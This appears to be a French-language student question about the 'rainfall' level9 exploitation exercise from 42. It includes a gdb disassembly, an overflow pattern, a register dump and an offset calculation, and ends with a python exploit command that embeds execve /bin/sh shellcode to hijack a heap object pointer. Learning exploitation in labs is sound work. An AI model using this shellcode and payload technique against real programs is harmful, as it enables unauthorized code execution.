@@ -1,0 +1,104 @@
+Je suis en train de faire le level9 de rainfall, un projet de sécu de 42. J'ai commencé `gdb ./level9` et `disas main` puis collé le code assembler suivant; "Dump of assembler code for function main:
+   0x080485f4 <+0>:	push   %ebp
+   0x080485f5 <+1>:	mov    %esp,%ebp
+   0x080485f7 <+3>:	push   %ebx
+   0x080485f8 <+4>:	and    $0xfffffff0,%esp
+   0x080485fb <+7>:	sub    $0x20,%esp
+   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
+   0x08048602 <+14>:	jg     0x8048610 <main+28>
+   0x08048604 <+16>:	movl   $0x1,(%esp)
+   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
+   0x08048610 <+28>:	movl   $0x6c,(%esp)
+   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
+   0x0804861c <+40>:	mov    %eax,%ebx
+   0x0804861e <+42>:	movl   $0x5,0x4(%esp)
+   0x08048626 <+50>:	mov    %ebx,(%esp)
+   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
+   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
+   0x08048632 <+62>:	movl   $0x6c,(%esp)
+   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
+   0x0804863e <+74>:	mov    %eax,%ebx
+   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
+   0x08048648 <+84>:	mov    %ebx,(%esp)
+   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
+   0x08048650 <+92>:	mov    %ebx,0x18(%esp)
+   0x08048654 <+96>:	mov    0x1c(%esp),%eax
+   0x08048658 <+100>:	mov    %eax,0x14(%esp)
+   0x0804865c <+104>:	mov    0x18(%esp),%eax
+   0x08048660 <+108>:	mov    %eax,0x10(%esp)
+   0x08048664 <+112>:	mov    0xc(%ebp),%eax
+   0x08048667 <+115>:	add    $0x4,%eax
+   0x0804866a <+118>:	mov    (%eax),%eax
+   0x0804866c <+120>:	mov    %eax,0x4(%esp)
+   0x08048670 <+124>:	mov    0x14(%esp),%eax
+   0x08048674 <+128>:	mov    %eax,(%esp)
+   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+   0x0804867c <+136>:	mov    0x10(%esp),%eax
+   0x08048680 <+140>:	mov    (%eax),%eax
+   0x08048682 <+142>:	mov    (%eax),%edx
+   0x08048684 <+144>:	mov    0x14(%esp),%eax
+   0x08048688 <+148>:	mov    %eax,0x4(%esp)
+   0x0804868c <+152>:	mov    0x10(%esp),%eax
+   0x08048690 <+156>:	mov    %eax,(%esp)
+   0x08048693 <+159>:	call   *%edx
+   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
+   0x08048698 <+164>:	leave  
+   0x08048699 <+165>:	ret    
+End of assembler dump." sur ce site `https://www.codeconvert.ai/` et il m'as sorti ça: "#include <cstdlib>
+#include <iostream>
+
+class N {
+public:
+    N(int value) {
+        this->value = value;
+    }
+
+    void setAnnotation(char* annotation) {
+        this->annotation = annotation;
+    }
+
+    void print() {
+        std::cout << "Value: " << value << ", Annotation: " << annotation << std::endl;
+    }
+
+private:
+    int value;
+    char* annotation;
+};
+
+int main(int argc, char* argv[]) {
+    if (argc <= 1) {
+        std::exit(1);
+    }
+
+    N* n1 = new N(5);
+    N* n2 = new N(6);
+
+    n1->setAnnotation(argv[1]);
+    n2->print();
+    n1->print();
+
+    return 0;
+}". J'ai ensuite fait segfault avec le pattern suivant: "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" issu de `https://wiremask.eu/tools/buffer-overflow-pattern-generator/?`, puis analysé `info register` comme ceci: "(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+(gdb) info register
+eax            0x41366441	1094083649
+ecx            0x0	0
+edx            0x0	0
+ebx            0x804a078	134520952
+esp            0xbffff640	0xbffff640
+ebp            0xbffff668	0xbffff668
+esi            0x0	0
+edi            0x0	0
+eip            0x8048682	0x8048682 <main+142>
+eflags         0x200202	[ IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) ". En collant l'adresse `0x41366441` du dernier pointeur avant segfault dans l'outil pour trouver l'offset de wiremask, j'obtiens 108. Je sait ensuite que je suis censé executer cette commande `./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')` qui contiens un shellcode et qui écrase l'EIP avec l'adresse du début du buffer avec du padding entre les 2 c'est bien ça? Mais je ne comprends pas comment trouver simplement l'adresse de début du buffer et aussi comment ça fonctionne vu que les var sont malloc avec new sur la heap ? Est ce qu'il y a des outil online, ou bien une simple soustraction suffit ?
